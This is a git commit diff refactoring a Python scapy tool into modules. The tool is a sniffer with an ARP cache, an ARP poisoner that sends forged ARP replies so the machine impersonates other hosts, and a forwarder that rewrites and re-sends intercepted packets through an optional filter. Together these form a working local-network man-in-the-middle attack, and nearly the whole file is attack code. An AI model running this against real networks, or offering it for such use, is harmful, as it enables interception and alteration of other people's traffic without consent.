37e162cce850a9f25078811eb6a045c51056509a
Victor "Nate" Graf <nategraf1@gmail.com>
2018-04-17 01:18:37 -0500

    big refactor to follow a module based approach

--- test/worker/capture.py
+++ test/worker/capture.py
@@ -3,56 +3,102 @@ import scapy.all as scapy
 import enum
 import net
 import threading
+import time
+
+# Turn off print messages
+scapy.conf.verb = 0
 
 class Sniffer(threading.Thread):
-    def __init__(self, iface=None, prn=None, store=True, quantum=0.25):
+    def __init__(self, iface=None, processor=None, store=False, quantum=0.25):
         threading.Thread.__init__(self)
         self.iface = iface
-        self.prn = prn
+        self.processor = processor
         self.store = store
         self.quantum = quantum
 
+        self.modules = []
         self.packets = []
 
         self._l2socket = None
         self._stopevent = threading.Event()
+        self._moduleslock = threading.RLock()
+        self._newmodules = []
+
+    def register(self, *mods):
+        with self._moduleslock:
+            self.modules.extend(mods)
+            self._newmodules.extend(mods)
+
+    def process(self, pkt):
+        with self._moduleslock:
+            for mod in self.modules:
+                if mod not in self._newmodules:
+                    mod.process(pkt)
+        if self.processor is not None:
+            self.processor(pkt)
 
     def run(self):
         try:
             self._l2socket = scapy.conf.L2listen(iface=self.iface)
+
             while not self._stopevent.is_set():
-                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.prn, store=self.store)
+                with self._moduleslock:
+                    while self._newmodules:
+                        self._newmodules.pop().start(self)
+
+                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.process, store=self.store)
                 self.packets.extend(pkts)
         finally:
+            with self._moduleslock:
+                for mod in self.modules:
+                    mod.stop()
+
             if self._l2socket is not None:
                 self._l2socket.close()
 
     def stop(self):
         self._stopevent.set()
 
-class ArpPoisoner(threading.Thread):
-    def __init__(self, iface=None, hwaddr=None, target=None, impersonate=None, store=False, quantum=1):
-        threading.Thread.__init__(self)
-        self.iface = iface
-        self.store = store
-        self.quantum = quantum
-        self.hwaddr = hwaddr or str(net.ifhwaddr(self.iface))
-        self.target = target
-        self.impersonate = impersonate
+class Module:
+    def start(self, sniffer):
+        pass
 
-        self.packets = []
+    def process(self, pkt):
+        pass
+
+    def stop(self):
+        pass
+
+class ArpCacheModule(Module):
+    def __init__(self, ignore=None):
+        self.sniffer = None
+        self.ignore = set() if ignore is None else set(ignore)
         self.cache = {}
 
-        self._l2socket = None
-        self._stopevent = threading.Event()
+    def start(self, sniffer):
+        self.sniffer = sniffer
+        if self.sniffer.iface is not None:
+            self.ignore.add(str(net.ifhwaddr(self.sniffer.iface)))
 
-    def cache_arp(self, pkt):
+    def process(self, pkt):
         if scapy.Ether in pkt and scapy.ARP in pkt:
             src = pkt[scapy.Ether].src
-            if src != '0.0.0.0' and src != self.hwaddr:
+            if src != '00:00:00:00:00:00' and src not in self.ignore:
                 psrc = pkt[scapy.ARP].psrc
                 if psrc != '0.0.0.0':
                     self.cache[psrc] = src
+
+class ArpPoisoner(threading.Thread):
+    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
+        threading.Thread.__init__(self)
+        self.arpcache = arpcache
+        self.iface = iface
+        self.interval = interval
+        self.hwaddr = hwaddr
+        self.target = target
+        self.impersonate = impersonate
+
+        self._stopevent = threading.Event()
 
     @staticmethod
     def enumerate(net):
@@ -82,27 +128,77 @@ class ArpPoisoner(threading.Thread):
         ifaddr = str(net.ifaddr(self.iface))
 
         # Filter out targets and impersonations not in our ARP cache
-        pdst = [ip for ip in self.enumerate(target) if ip in self.cache]
-        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.cache]
+        pdst = [ip for ip in self.enumerate(target) if ip in self.arpcache]
+        psrc = [ip for ip in self.enumerate(impersonate) if ip in self.arpcache]
 
-        # Build the packet list and filter out packets that would be sent to the true ip owner
-        pkts = [scapy.Ether(src=self.hwaddr, dst=self.cache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
-        pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]
+        if pdst:
+            # Build the packet list and filter out packets that would be sent to the true ip owner
+            pkts = [scapy.Ether(src=self.hwaddr, dst=self.arpcache[ip])/scapy.ARP(op=['who-has', 'is-at'], hwsrc=self.hwaddr, psrc=psrc, pdst=ip) for ip in pdst]
+            pkts = [p for p in pkts if p.psrc != p.pdst and p.dst != ifaddr]
 
-        # Launch the payload
-        scapy.sendp(pkts, iface=self.iface)
+            # Launch the payload
+            scapy.sendp(pkts, iface=self.iface)
 
     def run(self):
-        try:
-            self._l2socket = scapy.conf.L2listen(iface=self.iface)
-            self.arping()
-            while not self._stopevent.is_set():
-                self.arpoison()
-                pkts = self._l2socket.sniff(timeout=self.quantum, prn=self.cache_arp, store=self.store)
-                self.packets.extend(pkts)
-        finally:
-            if self._l2socket is not None:
-                self._l2socket.close()
+        if self.hwaddr is None:
+            self.hwaddr =  str(net.ifhwaddr(self.iface))
+
+        self.arping()
+        while not self._stopevent.is_set():
+            self.arpoison()
+            time.sleep(self.interval)
 
     def stop(self):
         self._stopevent.set()
+
+class ArpPoisonerModule(Module):
+    def __init__(self, arpcache, iface=None, hwaddr=None, target=None, impersonate=None, interval=1):
+        self.poisoner = ArpPoisoner(
+            arpcache=arpcache,
+            iface=iface,
+            hwaddr=hwaddr,
+            target=target,
+            impersonate=impersonate,
+            interval=interval
+        )
+        self.sniffer = None
+
+    def start(self, sniffer):
+        self.sniffer = sniffer
+        if self.poisoner.iface is None:
+            self.poisoner.iface = self.sniffer.iface
+
+        self.poisoner.start()
+
+    def stop(self):
+        self.poisoner.stop()
+
+class ForwarderModule(Module):
+    def __init__(self, arpcache, filter=None, iface=None, hwaddr=None):
+        self.arpcache = arpcache
+        self.filter = filter
+        self.iface = iface
+        self.hwaddr = hwaddr
+        self.sniffer = None
+
+    def start(self, sniffer):
+        self.sniffer = sniffer
+
+        if self.iface is None:
+            self.iface = sniffer.iface
+        if self.hwaddr is None:
+            self.hwaddr = str(net.ifhwaddr(self.iface))
+
+    def process(self, pkt):
+        if scapy.IP in pkt and scapy.Ether in pkt:
+            if pkt[scapy.Ether].dst == self.hwaddr and pkt[scapy.Ether].src != self.hwaddr:
+                if pkt[scapy.IP].dst in self.arpcache:
+                    pkt[scapy.Ether].dst = self.arpcache[pkt[scapy.IP].dst]
+
+                    # After having patched the dst MAC, but before patching the src, apply the filter
+                    if self.filter is not None:
+                        pkt = self.filter(pkt)
+
+                    if pkt is not None:
+                        pkt[scapy.Ether].src = self.hwaddr
+                        scapy.sendp(pkt, iface=self.iface)
